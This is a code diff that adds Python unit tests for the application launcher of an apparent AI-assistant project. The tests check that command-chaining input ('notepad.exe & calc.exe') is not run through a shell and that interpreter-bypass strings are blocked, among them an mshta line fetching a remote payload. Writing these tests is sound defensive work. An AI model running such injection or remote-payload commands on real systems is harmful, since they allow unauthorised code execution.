@@ -10,6 +10,7 @@ from core.dev_tools import git_status
 from core.memory import MemoryStore
 from core.orchestrator import PlanStep, TaskOrchestrator
 from core.permissions import PermissionEngine, Risk
+from core.tools import ToolRegistry, _open_application
 from core.workspace_context import WorkspaceContext
 
 
@@ -135,6 +136,30 @@ class NextGenCoreTests(unittest.TestCase):
             with patch.dict("os.environ", {"JARVIS_WORKSPACE": workspace}, clear=False):
                 with self.assertRaises(PermissionError):
                     git_status(outside)
+
+    def test_application_launch_never_uses_command_shell(self) -> None:
+        with patch("core.tools.subprocess.Popen") as popen:
+            popen.return_value.pid = 1234
+            result = _open_application("notepad.exe & calc.exe")
+            popen.assert_called_once_with("notepad.exe & calc.exe", shell=False)
+            self.assertIn("launcher_pid=1234", result)
+
+    def test_application_launch_blocks_interpreter_bypass(self) -> None:
+        blocked = [
+            "powershell.exe -Command calc.exe",
+            '"C:\\Windows\\System32\\cmd.exe" /c calc.exe',
+            "python.exe -c print(1)",
+            "node.exe -e console.log(1)",
+            "mshta.exe https://example.invalid/payload",
+        ]
+        for command in blocked:
+            with self.subTest(command=command):
+                with self.assertRaises(PermissionError):
+                    _open_application(command)
+
+    def test_powershell_tool_is_registered_high_risk(self) -> None:
+        registry = ToolRegistry()
+        self.assertEqual(registry._tools["run_powershell"].risk, Risk.HIGH)
 
 
 if __name__ == "__main__":
